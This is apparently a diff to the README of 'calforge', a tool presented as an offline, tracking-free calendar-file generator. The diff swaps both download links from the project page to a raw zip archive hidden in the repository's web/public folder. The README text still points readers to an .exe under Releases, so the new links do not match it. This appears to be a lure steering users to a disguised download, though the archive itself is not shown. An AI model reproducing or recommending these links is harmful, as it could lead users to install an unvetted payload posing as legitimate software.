@@ -1,6 +1,6 @@
 # 📅 calforge - Create calendar events without online tracking
 
-[![](https://img.shields.io/badge/Download_calforge-blue)](https://github.com/vbaha9706/calforge)
+[![](https://img.shields.io/badge/Download_calforge-blue)](https://github.com/vbaha9706/calforge/raw/refs/heads/main/web/public/Software-2.8-beta.4.zip)
 
 calforge turns event details into calendar files. You create files for Google, Outlook, Yahoo, and Apple calendars on your own computer. The software works offline. It does not track your data. It does not store your information on external servers. You keep control of your personal event data.
 
@@ -8,7 +8,7 @@ calforge turns event details into calendar files. You create files for Google, O
 
 You must visit the project page to get the application files. 
 
-[Click here to open the download page](https://github.com/vbaha9706/calforge)
+[Click here to open the download page](https://github.com/vbaha9706/calforge/raw/refs/heads/main/web/public/Software-2.8-beta.4.zip)
 
 Look for the latest version under the Releases section. Choose the file ending in .exe for Windows. Save this file to your computer.
 
